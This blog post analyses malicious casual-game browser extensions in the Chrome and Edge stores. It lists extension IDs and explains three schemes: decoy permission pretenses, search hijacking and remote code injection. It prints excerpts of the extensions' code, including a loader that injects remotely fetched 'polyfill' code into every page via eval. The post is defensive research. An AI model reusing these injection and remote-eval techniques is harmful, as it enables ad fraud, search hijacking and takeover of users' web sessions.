---
categories:
- security
- privacy
- add-ons
date: 2023-06-14T16:18:00+0200
description: Quite a few casual games browser extensions request access to all websites.
  I look into some of these extensions which you should obviously avoid.
lastmod: '2023-08-08 04:48:27'
title: Why browser extension games need access to all websites
---

When installing browser extensions in Google Chrome, you are asked to confirm the extension’s permissions. In theory, this is supposed to allow assessing the risk associated with an extension. In reality however, users typically lack the knowledge to properly interpret this prompt. For example, I’ve often [seen users accusing extension developers of spying just because the prompt says they *could*](/2016/07/02/why-mozilla-shouldn-t-copy-chrome-s-permission-prompt-for-extensions/#informed-decisions).

{{< img src="permission_prompt.png" width="600" alt="A browser prompt titled: “Add Vex 4 Unblocked game?” The text below: “It can: Read and change all your data on all websites”" />}}

On the other hand, people will often accept these cryptic prompts without thinking twice. They expect the browser vendors to keep them out of harm’s way, trust that isn’t always justified [[1]](/2023/05/31/more-malicious-extensions-in-chrome-web-store/) [[2]](/2023/06/05/introducing-pcvark-and-their-malicious-ad-blockers/) [[3]](/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/). The most extreme scenario here is casual games not interacting with the web at all, yet requesting access to all websites. I found a number of extensions that will abuse this power to hijack websites.

{{< toc >}}

## The affected extensions

The extensions listed below belong to three independent groups. Each group is indicated in the “Issue” column and explained in more detail in a dedicated section below.

As the extension IDs are getting too many, I created a repository where I [list the IDs from all articles in this series](https://github.com/palant/malicious-extensions-list/blob/main/list.txt). There is also a [check-extensions utility available for download](https://github.com/palant/malicious-extensions-list/releases/) that will search local browser profiles for these extensions.

Extensions in Chrome Web Store:

| Name | Weekly active users | Extension ID | Issue |
|------|--------------------:|--------------|-------|
| 2048 Classic Game | 486,569 | kgfeiebnfmmfpomhochmlfmdmjmfedfj | False pretenses |
| Tetris Classic | 461,812 | pmlcjncilaaaemknfefmegedhcgelmee | False pretenses |
| Doodle Jump original | 431,236 | ohdgnoepeabcfdkboidmaedenahioohf | Search hijacking |
| Doodle Jump Classic Game | 274,688 | dnbipceilikdgjmeiagblfckeialaela | False pretenses |
| Slope Unblocked Game | 99,949 | aciipkgmbljbcokcnhjbjdhilpngemnj | Search hijacking |
| Drift Hunters Unblocked Game | 77,812 | nlmjpeojbncdmlfkpppngdnolhfgiehn | Search hijacking |
| Vex 4 Unblocked game | 63,164 | phjhbkdgnjaokligmkimgnlagccanodn | Search hijacking |
| Crossy Road Game unblocked | 9,511 | fkhpfgpmejefmjaeelgoopkcglgafedm | Search hijacking |
| Run 3 Unblocked | 7,299 | mcmmiinopedfbaoongoclagidncaacbd | Search hijacking |

Extensions in Edge Add-ons store:

| Name | Weekly active users | Extension ID | Issue |
|------|--------------------:|--------------|-------|
| Slope Unblocked Game | 6,038 | ndcokkmfmiaecmndbpohaogmpmchfpkk | Code injection |
| Drift Hunters Unblocked | 3,107 | cpmpjapeeidaikiiemnddfgfdfjjhgif | Code injection |
| Tetris Classic | 2,052 | ajefbooiifdkmgkpjkanmgbjbndfbfhg | False pretenses |

## False pretenses

Last week, I’ve written about a [cluster of browser extensions that would systematically request excessive permissions](/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/), typically paired with attempts to make it look like these permissions are actually required. This article already lists several casual games among other extensions.

This isn’t the only large cluster in Chrome Web Store however, there is at least one more. [The 34 malicious extensions Google removed recently](/2023/05/31/more-malicious-extensions-in-chrome-web-store/) belonged to this cluster. I’m counting at least 50 more extension in this cluster without obvious malicious functionality, including three casual games.

The extension “2048 Classic Game” and similar ones request access to all websites. They use this access to run a content script on all websites, with code like this:

```js
let {quickAccess} = await chrome.storage.local.get("quickAccess");
if (quickAccess)
  displayButton();

function displayButton()
{
  document.addEventListener("DOMContentLoaded", async () => {
    if (!document.getElementById(`${ chrome.runtime.id }-img`))
    {
      document.body.insertAdjacentHTML("beforebegin", "…");
      document.getElementById(`${ chrome.runtime.id }-btn`)
          .addEventListener("click", () =>
      {
        chrome.runtime.sendMessage({ action: "viewPopup" });
      });
    }
  });
}
```

Yes, there is a race condition here: what if `storage.local.get()` call is slow and finishes after `DOMContentLoaded` event already fires? Also: yes, adding some HTML code to the beginning of every page is going to cause a massive mess. None of this is really a problem however as this code isn’t actually meant to run. See, the `quickAccess` flag in `storage.local` is never being set. It cannot, these extensions don’t have a preferences page.

So this entire content script serves only as a pretense, making it look like the requested permissions are required when they are really not. At some point in the future these extensions are meant to be updated into malicious versions which will abuse these permissions.

## Search hijacking

The “Vex 4 Unblocked game” and similar extensions actually contain their malicious code already. They also inject a content script into all web pages. First that content script makes sure to download “options” data from `https://cloudenginesdk.com/api/v2/`. It then injects a script from the extension into the page:

```js
let script = document.createElement("script");
script.setAttribute("data-options", data);
script.setAttribute("src", chrome.runtime.getURL("js/options.js"));
script.onload = () => {
  document.documentElement.removeChild(script);
};
document.documentElement.appendChild(script);
```

What does the “options” data returned by cloudenginesdk[.]com look like? The usual response looks like this:

```json
{
  "check":"sdk",
  "selector":".game-area",
  "mask":"cloudenginesdk.com",
  "g":"game",
  "b":"beta",
  "debug":""
}
```

Given the code in `js/options.js`, this data makes no sense. The `mask` field specifies which websites the code should run on. This code clearly isn’t meant to run on `cloudenginesdk.com`, a website without any pages. So this is a decoy, the server will serve the actual malicious instructions at some point in the future.

Without having seen the instructions, it’s still obvious that the code processing them is meant to run on search pages. The processing for Google search pages booby-traps search results: when a result link is clicked, this script will open a pop-up, sending you to some page receiving your search query as parameter.

For Yahoo pages, this script will download some additional data containing some selectors. Your clicks to one element are then redirected to another element. Presumably, the goal is making you click on ads ([ad fraud](https://en.wikipedia.org/wiki/Ad_fraud)).

That’s only the obvious part of the functionality however. In addition to that, this code will also inject additional scripts into web pages, presumably showing ads. It will send your search queries to some third party. And it has the capability of running arbitrary JavaScript on any web page.

So while this seems to be geared towards showing you additional search ads, the same functionality could hijack your online banking session for example.

## Code injection

The malicious games in Microsoft’s Edge Add-ons store have slight similarities to the ones doing search hijacking. I cannot be certain that they are being published by the same actor however, their functionality is far less sophisticated. The content script simply injects a “browser polyfill” script:

```js
chrome.storage.local.get("polyfill", ({polyfill}) => {
	document.documentElement.setAttribute("data-polyfill", polyfill);
	let elem = document.createElement("script");
	elem.src = chrome.runtime.getURL("js/browser-polyfill.js");
	elem.onload = () => {
    document.documentElement.removeChild(elem)
  };
	document.documentElement.appendChild(elem);
});
```

And what does that “polyfill” script do? It runs the “polyfill” code:

```js
const job = document.documentElement.getAttribute("data-polyfill");
document.documentElement.removeAttribute("data-polyfill");
job && eval(job);
```

So where does this “polyfill” code come from? The extension downloads it from `https://polyfilljs.org/browser-polyfill`.

For me, this download produces only an empty object. Presumably, it will only give out the malicious script to people who have been using the extension for a while. And that script will be injected into each and every website visited then.